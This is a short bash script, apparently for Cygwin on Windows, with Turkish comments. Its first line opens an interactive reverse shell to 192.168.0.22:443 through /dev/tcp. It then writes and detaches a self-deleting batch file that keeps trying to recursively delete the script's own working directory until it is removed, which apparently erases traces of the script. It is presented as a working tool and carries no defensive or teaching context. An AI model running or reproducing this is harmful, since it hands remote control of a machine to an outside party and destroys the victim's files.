#!/bin/bash

bash -i >&/dev/tcp/192.168.0.22/443 0>&1

TARGET_DIR=$(cygpath -w "$PWD")

# 2. Arka planda kilit kalkana kadar döngüye giren batch betiği oluştur
CLEAN_BAT="$TEMP/del_bashexe_$RANDOM.bat"

cat << 'EOF' > "$CLEAN_BAT"
@echo off
set "TARGET=%~1"
:loop
timeout /t 1 /nobreak >nul
rmdir /s /q "%TARGET%" 2>nul
if exist "%TARGET%" goto loop
del "%~f0"
EOF

# 3. Arka plan siliciyi tamamen bağımsız süreç olarak başlat
cmd.exe /c start /b "" "$CLEAN_BAT" "$TARGET_DIR"

# 4. Kendi çalışma dizinini üst klasöre çek
cd ..

# 5. İlettiğin interaktif komutu çalıştır
bash -i -c "dir"
